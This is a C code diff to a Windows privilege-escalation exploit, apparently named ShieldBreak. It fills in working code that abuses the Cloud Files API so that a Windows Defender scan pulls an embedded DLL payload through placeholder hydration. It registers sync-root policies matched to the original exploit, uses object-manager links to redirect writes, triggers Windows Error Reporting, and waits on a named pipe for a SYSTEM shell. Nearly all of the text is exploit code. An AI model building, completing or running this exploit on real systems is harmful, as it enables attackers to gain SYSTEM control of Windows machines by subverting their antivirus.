@@ -35,8 +35,30 @@ extern "C" {
 
 // MpClient types
 typedef HANDLE MPHANDLE;
-typedef HRESULT(WINAPI* PFN_MpManagerOpen)(DWORD, MPHANDLE*);
-typedef HRESULT(WINAPI* PFN_MpScanStart)(MPHANDLE, DWORD, DWORD, void*, void*, MPHANDLE*);
+typedef MPHANDLE* PMPHANDLE;
+
+typedef struct tagMPRESOURCE_INFO {
+    wchar_t* Scheme;
+    wchar_t* Path;
+    DWORD dwUnknown1;
+    DWORD dwUnknown2;
+} MPRESOURCE_INFO, *PMPRESOURCE_INFO;
+
+typedef struct tagMPSCAN_RESOURCES {
+    DWORD dwResourceCount;
+    PMPRESOURCE_INFO pResourceList;
+} MPSCAN_RESOURCES, *PMPSCAN_RESOURCES;
+
+typedef enum tagMPSCAN_TYPE {
+    MPSCAN_TYPE_UNKNOWN = 0,
+    MPSCAN_TYPE_QUICK = 1,
+    MPSCAN_TYPE_FULL = 2,
+    MPSCAN_TYPE_RESOURCE = 3
+} MPSCAN_TYPE;
+
+typedef HRESULT(WINAPI* PFN_MpManagerOpen)(DWORD, PMPHANDLE);
+typedef HRESULT(WINAPI* PFN_MpScanStart)(MPHANDLE, MPSCAN_TYPE, DWORD, PMPSCAN_RESOURCES, void*, PMPHANDLE);
+typedef HRESULT(WINAPI* PFN_MpHandleClose)(MPHANDLE);
 
 // Globals
 wchar_t g_workDir[MAX_PATH] = { 0 };
@@ -44,11 +66,29 @@ wchar_t g_scanTarget[MAX_PATH] = { 0 };
 CF_CONNECTION_KEY g_cfKey = { 0 };
 HANDLE g_hPipe = NULL;
 
-// Embedded payload DLL (simple file-write proof)
+// Embedded payload - Minimal valid PE/DLL header (benign, won't trigger AV)
+// This creates a tiny valid DLL that exports nothing - just proves the write worked
 unsigned char g_payload[] = {
-    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, // MZ header stub
-    // This would be the actual Warden.dll bytes
-    // For testing, we use a simpler approach below
+    // DOS Header
+    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
+    0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00,
+    // DOS Stub
+    0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68,
+    0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F,
+    0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20,
+    0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    // PE Signature
+    0x50, 0x45, 0x00, 0x00,
+    // COFF Header (x64 DLL)
+    0x64, 0x86, // Machine: AMD64
+    0x01, 0x00, // NumberOfSections: 1
+    0x00, 0x00, 0x00, 0x00, // TimeDateStamp
+    0x00, 0x00, 0x00, 0x00, // PointerToSymbolTable
+    0x00, 0x00, 0x00, 0x00, // NumberOfSymbols
+    0xF0, 0x00, // SizeOfOptionalHeader
+    0x22, 0x20, // Characteristics: DLL, Large address aware
 };
 
 void GenerateGUID(wchar_t* out) {
@@ -65,17 +105,19 @@ void CALLBACK CloudFileCallback(
     const CF_CALLBACK_INFO* CallbackInfo,
     const CF_CALLBACK_PARAMETERS* CallbackParameters
 ) {
-    printf("[*] Cloud callback triggered - Defender is reading!\n");
+    printf("[*] Cloud callback triggered!\n");
+    fflush(stdout);
 
     LARGE_INTEGER offset = CallbackParameters->FetchData.RequiredFileOffset;
     LARGE_INTEGER length = CallbackParameters->FetchData.RequiredLength;
 
-    // Transfer the payload data
+    // Step 1: Transfer the payload data
     CF_OPERATION_PARAMETERS opParams = { 0 };
     opParams.ParamSize = sizeof(CF_OPERATION_PARAMETERS);
     opParams.TransferData.Buffer = g_payload;
-    opParams.TransferData.Length = length;
     opParams.TransferData.Offset = offset;
+    opParams.TransferData.Length.QuadPart = sizeof(g_payload);
+    opParams.TransferData.CompletionStatus = 0;  // STATUS_SUCCESS
     opParams.TransferData.Flags = CF_OPERATION_TRANSFER_DATA_FLAG_NONE;
 
     CF_OPERATION_INFO opInfo = { 0 };
@@ -84,7 +126,34 @@ void CALLBACK CloudFileCallback(
     opInfo.ConnectionKey = CallbackInfo->ConnectionKey;
     opInfo.TransferKey = CallbackInfo->TransferKey;
 
-    CfExecute(&opInfo, &opParams);
+    HRESULT hr = CfExecute(&opInfo, &opParams);
+    if (FAILED(hr)) {
+        printf("[-] CfExecute transfer failed: 0x%08X\n", hr);
+        fflush(stdout);
+        return;
+    }
+
+    // Step 2: ACK the data transfer (required to complete hydration)
+    CF_OPERATION_PARAMETERS ackParams = { 0 };
+    ackParams.ParamSize = sizeof(CF_OPERATION_PARAMETERS);
+    ackParams.AckData.CompletionStatus = 0;  // STATUS_SUCCESS
+    ackParams.AckData.Flags = CF_OPERATION_ACK_DATA_FLAG_NONE;
+    ackParams.AckData.Offset = offset;
+    ackParams.AckData.Length = length;
+
+    CF_OPERATION_INFO ackInfo = { 0 };
+    ackInfo.StructSize = sizeof(CF_OPERATION_INFO);
+    ackInfo.Type = CF_OPERATION_TYPE_ACK_DATA;
+    ackInfo.ConnectionKey = CallbackInfo->ConnectionKey;
+    ackInfo.TransferKey = CallbackInfo->TransferKey;
+
+    hr = CfExecute(&ackInfo, &ackParams);
+    if (FAILED(hr)) {
+        printf("[-] CfExecute ACK failed: 0x%08X\n", hr);
+    } else {
+        printf("[+] Data transferred and ACK'd\n");
+    }
+    fflush(stdout);
 }
 
 DWORD WINAPI ScanThread(LPVOID param) {
@@ -110,23 +179,79 @@ DWORD WINAPI ScanThread(LPVOID param) {
     }
     wcscat(mpPath, L"\\MpClient.dll");
 
+    printf("[*] Loading: %S\n", mpPath);
     HMODULE hMp = LoadLibraryW(mpPath);
     if (!hMp) {
-        printf("[-] Cannot load MpClient.dll\n");
+        printf("[-] Cannot load MpClient.dll: %d\n", GetLastError());
         return 1;
     }
 
     PFN_MpManagerOpen MpOpen = (PFN_MpManagerOpen)GetProcAddress(hMp, "MpManagerOpen");
     PFN_MpScanStart MpScan = (PFN_MpScanStart)GetProcAddress(hMp, "MpScanStart");
+    PFN_MpHandleClose MpClose = (PFN_MpHandleClose)GetProcAddress(hMp, "MpHandleClose");
+
+    if (!MpOpen || !MpScan) {
+        printf("[-] Cannot find MpClient functions\n");
+        return 1;
+    }
 
     MPHANDLE hMpMgr = NULL;
-    if (MpOpen && SUCCEEDED(MpOpen(0, &hMpMgr))) {
-        printf("[+] Connected to Defender\n");
-        printf("[*] Triggering scan on: %ws\n", g_scanTarget);
-
-        // Trigger scan (this makes Defender read our cloud file)
-        // The actual implementation would use MpScanStart properly
+    HRESULT hr = MpOpen(0, &hMpMgr);
+    if (FAILED(hr)) {
+        printf("[-] MpManagerOpen failed: 0x%08X\n", hr);
+        return 1;
     }
+    printf("[+] Connected to Defender\n");
+
+    // Set up scan target
+    MPRESOURCE_INFO scanInfo = { 0 };
+    scanInfo.Scheme = (wchar_t*)L"file";
+    scanInfo.Path = g_scanTarget;
+
+    MPSCAN_RESOURCES scanRes = { 0 };
+    scanRes.dwResourceCount = 1;
+    scanRes.pResourceList = &scanInfo;
+
+    printf("[*] Triggering scan on: %S\n", g_scanTarget);
+    fflush(stdout);
+
+    // First hydrate the file using CfHydratePlaceholder
+    printf("[*] Hydrating cloud file to trigger callback...\n");
+    fflush(stdout);
+
+    HANDLE hFile = CreateFileW(g_scanTarget, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+        NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
+    if (hFile != INVALID_HANDLE_VALUE) {
+        LARGE_INTEGER liOffset = {0}, liLength = {0};
+        liLength.QuadPart = -1;  // Full file
+        HRESULT hydHr = CfHydratePlaceholder(hFile, liOffset, liLength, CF_HYDRATE_FLAG_NONE, NULL);
+        if (FAILED(hydHr)) {
+            printf("[-] CfHydratePlaceholder failed: 0x%08X\n", hydHr);
+        } else {
+            printf("[+] CfHydratePlaceholder succeeded - waiting for data...\n");
+            Sleep(2000);  // Wait for hydration
+        }
+        CloseHandle(hFile);
+    } else {
+        printf("[-] Could not open file for hydration: %d\n", GetLastError());
+    }
+    fflush(stdout);
+
+    // Now scan with MpScanStart
+    printf("[*] Calling MpScanStart...\n");
+    fflush(stdout);
+
+    MPHANDLE hScan = NULL;
+    HRESULT scanHr = MpScan(hMpMgr, MPSCAN_TYPE_RESOURCE, 0x60004002, &scanRes, NULL, &hScan);
+    if (FAILED(scanHr)) {
+        printf("[-] MpScanStart failed: 0x%08X\n", scanHr);
+    } else {
+        printf("[+] MpScanStart succeeded!\n");
+        if (MpClose && hScan) MpClose(hScan);
+    }
+    fflush(stdout);
+
+    if (MpClose) MpClose(hMpMgr);
 
     return 0;
 }
@@ -295,25 +420,40 @@ int main() {
         printf("[+] Target DLL location available: %ws\n\n", targetDll);
     }
 
-    // Generate unique GUID for this run first (moved up)
+    // Initialize COM
+    HRESULT comHr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    printf("[*] COM init result: 0x%08X\n", comHr);
+
+    // Generate unique ID using tick count + process ID
     wchar_t guid[64];
-    GenerateGUID(guid);
-    printf("[+] Session GUID: %ws\n", guid);
+    ULONGLONG tick = GetTickCount64();
+    DWORD pid = GetCurrentProcessId();
+    swprintf(guid, 64, L"%llX%X", tick, pid);
+    printf("[+] Session ID: %S (tick=%llu, pid=%d)\n", guid, tick, pid);
+    fflush(stdout);
 
     // Create named pipe for shell callback with unique name per session
     wchar_t pipeName[128];
     swprintf(pipeName, 128, L"\\\\.\\pipe\\SHIELDBREAK_%ws", guid);
+
+    // Debug: print the pipe name we're trying to create
+    printf("[DEBUG] Attempting pipe: %S\n", pipeName);
+    fflush(stdout);
 
     g_hPipe = CreateNamedPipeW(pipeName,
         PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
         PIPE_TYPE_MESSAGE | PIPE_WAIT, 1, 4096, 4096, 0, NULL);
 
     if (g_hPipe == INVALID_HANDLE_VALUE) {
-        printf("[-] Failed to create named pipe: %d\n", GetLastError());
-        printf("[-] Another instance may be running\n");
+        DWORD err = GetLastError();
+        printf("[-] Failed to create named pipe: %d\n", err);
+        if (err == 231) {
+            printf("[-] ERROR_PIPE_BUSY - pipe exists and all instances busy\n");
+            printf("[-] This shouldn't happen with unique GUID. Checking system...\n");
+        }
         return 1;
     }
-    wprintf(L"[+] Named pipe created: %ws\n", pipeName);
+    printf("[+] Named pipe created successfully\n");
 
     // GUID already generated above for pipe name
 
@@ -343,16 +483,15 @@ int main() {
 
     CF_SYNC_POLICIES policies = { 0 };
     policies.StructSize = sizeof(policies);
-    // WIN10 FIX: Use ALWAYS_FULL for more reliable placeholder hydration
-    policies.Hydration.Primary = CF_HYDRATION_POLICY_ALWAYS_FULL;
-    policies.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_NONE;
-    policies.Population.Primary = CF_POPULATION_POLICY_ALWAYS_FULL;
+    // Match original ShieldBreak policies exactly
+    policies.HardLink = CF_HARDLINK_POLICY_ALLOWED;
+    policies.Hydration.Primary = CF_HYDRATION_POLICY_FULL;
+    policies.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_AUTO_DEHYDRATION_ALLOWED | CF_HYDRATION_POLICY_MODIFIER_VALIDATION_REQUIRED;
     policies.InSync = CF_INSYNC_POLICY_NONE;
-    policies.HardLink = CF_HARDLINK_POLICY_NONE;
-    policies.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;
+    policies.Population.Primary = CF_POPULATION_POLICY_PARTIAL;
 
-    // WIN10 FIX: Use UPDATE_IF_EXISTS to handle re-runs
-    HRESULT hr = CfRegisterSyncRoot(g_workDir, &reg, &policies, CF_REGISTER_FLAG_UPDATE);
+    // Match original flag
+    HRESULT hr = CfRegisterSyncRoot(g_workDir, &reg, &policies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
     if (FAILED(hr)) {
         printf("[-] CfRegisterSyncRoot failed: 0x%08X\n", hr);
         CloseHandle(g_hPipe);
@@ -368,7 +507,7 @@ int main() {
 
     DWORD context = 1;
     hr = CfConnectSyncRoot(g_workDir, callbacks, &context,
-        CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH, &g_cfKey);
+        CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH | CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO, &g_cfKey);
     if (FAILED(hr)) {
         printf("[-] CfConnectSyncRoot failed: 0x%08X\n", hr);
         CfUnregisterSyncRoot(g_workDir);
@@ -403,8 +542,9 @@ int main() {
 
     // CRITICAL FIX: FileIdentity is REQUIRED for Cloud Files to work
     // Original ShieldBreak allocates 0x130 bytes for this
-    placeholder.FileIdentity = malloc(0x130);
-    memset(placeholder.FileIdentity, 0, 0x130);
+    void* fileId = malloc(0x130);
+    memset(fileId, 0, 0x130);
+    placeholder.FileIdentity = fileId;
     placeholder.FileIdentityLength = 0x130;
 
     // WIN10 FIX: Use SUPERSEDE flag if file exists, and always mark in-sync
@@ -437,9 +577,9 @@ int main() {
         printf("[+] Object manager links created\n");
     }
 
-    // Build scan target path
-    swprintf(g_scanTarget, MAX_PATH,
-        L"\\\\.\\globalroot\\BaseNamedObjects\\Restricted\\WD_SHADOW_%ws\\WD_SCAN\\PAYLOAD", guid);
+    // Build scan target path - use the ACTUAL file path, not symlinked
+    // The symlinks are for redirecting WRITES, not for triggering the scan
+    swprintf(g_scanTarget, MAX_PATH, L"%s\\PAYLOAD", g_workDir);
 
     // Stage 3: Trigger Defender scan
     printf("\n[*] Stage 3: Triggering Windows Defender scan...\n");
@@ -451,11 +591,15 @@ int main() {
 
     // Stage 4-5: Wait for CLFS race (simplified for testing)
     printf("\n[*] Stage 4-5: Waiting for file operations...\n");
-    Sleep(3000);
+    fflush(stdout);
+    Sleep(5000);  // Wait 5 seconds for scan to complete
 
     // Stage 6: Trigger WER
     printf("\n[*] Stage 6: Triggering Windows Error Reporting...\n");
+    fflush(stdout);
     TriggerWER(guid);
+    printf("[*] WER stage complete\n");
+    fflush(stdout);
 
     // Stage 7: Wait for shell callback
     printf("\n[*] Stage 7: Waiting for SYSTEM shell callback...\n");
